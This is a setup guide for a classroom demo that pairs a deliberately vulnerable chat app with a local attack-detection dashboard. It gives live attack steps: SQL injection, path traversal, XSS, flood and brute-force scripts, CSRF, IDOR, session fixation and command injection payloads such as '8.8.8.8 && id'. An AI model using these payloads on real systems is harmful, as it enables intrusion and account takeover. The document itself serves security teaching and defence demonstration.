# NexaChat + ShieldWatch — Demo Setup Guide

## Overview

NexaChat runs on Render.com (cloud, public URL).
ShieldWatch runs on YOUR laptop.
ngrok connects them.

```
[Anyone's Browser]
       ↓
[NexaChat on Render]  ← public internet
       ↓  (sends attack events through ngrok)
[ngrok tunnel]
       ↓
[ShieldWatch on YOUR Laptop]
       ↓
[Red Dashboard at localhost:3002]
```

---

## ONE-TIME SETUP (do this before demo day)

### Step 1 — Deploy NexaChat to Render

1. Go to https://github.com and create a new repository called `nexachat`
2. Open Terminal and run:
   ```bash
   cd ~/Desktop/NexaChat
   git init
   git add .
   git commit -m "NexaChat initial deploy"
   git remote add origin https://github.com/YOUR_USERNAME/nexachat.git
   git push -u origin main
   ```
3. Go to https://render.com → Sign up free → New Web Service
4. Connect your GitHub repo `nexachat`
5. Render auto-detects the settings from render.yaml
6. Click **Deploy** — wait ~3 minutes
7. You get a URL like: `https://nexachat.onrender.com`

### Step 2 — Install ngrok (free)

1. Go to https://ngrok.com → Sign up free → Download ngrok
2. Or install via Terminal:
   ```bash
   brew install ngrok
   ```
3. Authenticate:
   ```bash
   ngrok config add-authtoken YOUR_NGROK_TOKEN
   ```
   (Get your token from ngrok.com dashboard after signup)

### Step 3 — Connect ShieldWatch to Render

1. Start ShieldWatch locally:
   ```bash
   cd ~/Desktop/ShieldWatch
   node collector.js
   ```

2. In a NEW terminal, start ngrok:
   ```bash
   ngrok http 3002
   ```

3. ngrok gives you a URL like:
   ```
   https://abc123.ngrok-free.app
   ```
   Copy the part AFTER https:// → `abc123.ngrok-free.app`

4. Go to Render dashboard → Your nexachat service → Environment
5. Set `SW_CEREBRO_ADDR` = `abc123.ngrok-free.app`
6. Click **Save Changes** → Render redeploys automatically (~1 min)

---

## DEMO DAY — Start Everything

### Terminal 1 — ShieldWatch Dashboard:
```bash
cd ~/Desktop/ShieldWatch
node collector.js
```

### Terminal 2 — ngrok tunnel:
```bash
ngrok http 3002
```

### Browser 1 — ShieldWatch Dashboard (only you see this):
```
http://localhost:3002
```

### Browser 2 — NexaChat (the target — share this URL with class):
```
https://nexachat.onrender.com
```

---

## DEMO ATTACKS (perform these live)

### Attack 1 — SQL Injection (bypasses login)
1. Go to NexaChat login page
2. Username: `admin'--`
3. Password: anything (e.g. `wrong`)
4. Click Sign In → ShieldWatch BLOCKS it
5. Dashboard lights up: BLOCKED | SQLI

### Attack 2 — Path Traversal (reads secret file)
1. Open browser DevTools (F12) → Console
2. Run:
   ```javascript
   fetch('/api/file?path=../private/db_config.txt')
     .then(r => r.json()).then(d => console.log(d.content))
   ```
3. Shows ShieldWatch BLOCKS it (with ShieldWatch ON)
4. Shows the actual secret file contents (demo without ShieldWatch)

### Attack 3 — Honeypot
1. In browser console:
   ```javascript
   fetch('/api/admin/users').then(r=>r.json()).then(console.log)
   ```
2. Returns FAKE admin credentials
3. Dashboard shows: DECOY | HONEYPOT
4. Attacker profile appears with browser fingerprint!

### Attack 4 — XSS (search bar)
1. Log in as any user
2. Click the search icon
3. Search for: `<img src=x onerror=alert('XSS')>`
4. Without ShieldWatch: alert fires
5. With ShieldWatch: BLOCKED

### Attack 5 — DDoS Flood (login endpoint)
1. Open Terminal and run:
   ```bash
   cd ~/Desktop/NexaChat
   node ddos-flood.js
   ```
2. Sends 50 parallel requests to `/api/login`
3. **Without ShieldWatch**: all 50 go through (server hammered, ✓ ✓ ✓ ✓ ...)
4. **With ShieldWatch**: first 20 pass, then 30 get BLOCKED with 429 (🛡 🛡 🛡 ...)
5. Dashboard shows: BLOCKED | DDOS with flood count + IP info

**Pro tip**: Run it twice with ShieldWatch ON — second run is blocked from the very first request!

### Attack 6 — CSRF (profile hijack)
1. Log into NexaChat as **alice**
2. In the SAME browser, open a new tab and go to:
   ```
   https://nexachat-aj89.onrender.com/csrf-attack.html
   ```
3. Click **"Claim My Reward"** button
4. **Without ShieldWatch**: Alice's bio changes to "HACKED via CSRF" — silently!
5. **With ShieldWatch**: BLOCKED — dashboard shows CSRF verdict

### Attack 7 — IDOR (reads any user's password)
1. In browser console:
   ```javascript
   fetch('/api/user/1').then(r=>r.json()).then(d=>console.log(d.user))
   ```
2. Returns admin's full database record — **including plain-text password**
3. Try other IDs: `/api/user/2`, `/api/user/3`, etc.
4. **With ShieldWatch**: BLOCKED — IDOR pattern detected

### Attack 8 — Session Fixation (account takeover)
1. In browser console (Tab 1 — attacker):
   ```javascript
   // Step 1: See the victim's session ID
   fetch('/api/session/id').then(r=>r.json()).then(console.log)
   ```
2. Copy the `sessionId` from the response
3. In browser console (Tab 2 — attacker pretending to be alice):
   ```javascript
   // Step 2: Set cookies to victim's session ID
   document.cookie = 'connect.sid=PASTE_SESSION_ID_HERE; path=/'
   // Step 3: Now access any authenticated endpoint AS alice
   fetch('/api/me').then(r=>r.json()).then(console.log)
   ```
4. You're now logged in as alice without her password!
5. **With ShieldWatch**: BLOCKED on `/api/session/id` access

### Attack 9 — Command Injection (OS commands on server)
1. In browser console (must be logged in):
   ```javascript
   fetch('/api/tools/ping', {
     method: 'POST',
     headers: {'Content-Type': 'application/json'},
     body: JSON.stringify({ host: '8.8.8.8 && id' })
   }).then(r=>r.json()).then(d=>console.log(d.output))
   ```
2. Without ShieldWatch: Server runs `id` — shows server's user/uid
3. Try: `8.8.8.8 && ls /` → lists server root directory
4. Try: `8.8.8.8 && cat /etc/hostname` → reveals server hostname
5. **With ShieldWatch**: cmdInjection patterns detected → BLOCKED

### Attack 10 — Brute Force (password cracking)
1. Open Terminal and run:
   ```bash
   cd ~/Desktop/NexaChat
   node brute-force.js
   ```
2. Tries 30 common passwords against admin account (150ms between attempts)
3. **Without ShieldWatch**: Tries until `admin123` found → prints ✅ SUCCESS
4. **With ShieldWatch**: Blocked after 5 failures → prints 🛡️ BLOCKED
5. Dashboard shows BRUTE FORCE verdict with failure count

---

## What the Dashboard Shows

When an attack happens the dashboard shows:
- BLOCKED / DECOY verdict in red
- The exact attack payload
- Attacker's real browser (Chrome 120, Firefox, etc.)
- Real OS (Windows 11, macOS, Linux)
- Real screen resolution
- Real GPU model
- Real timezone
- IP address → country, city, ISP
- Threat score (0–100)

---

## Demo Accounts

| Username  | Password  | Role  |
|-----------|-----------|-------|
| admin     | admin123  | Admin |
| alice     | alice123  | User  |
| bob       | bob123    | User  |
| attacker  | hack3r    | User  |

---

## Troubleshooting

| Problem | Fix |
|---------|-----|
| NexaChat not loading | Check Render dashboard — may be sleeping (free tier sleeps after 15 min inactivity, first load takes ~30 sec) |
| Dashboard not receiving events | Check ngrok is running. Check SW_CEREBRO_ADDR on Render matches ngrok URL |
| ngrok URL changed | ngrok gives new URL every restart. Update SW_CEREBRO_ADDR on Render each time |
| ShieldWatch not showing fingerprint | Wait 3 seconds after page load — beacon runs with a delay |
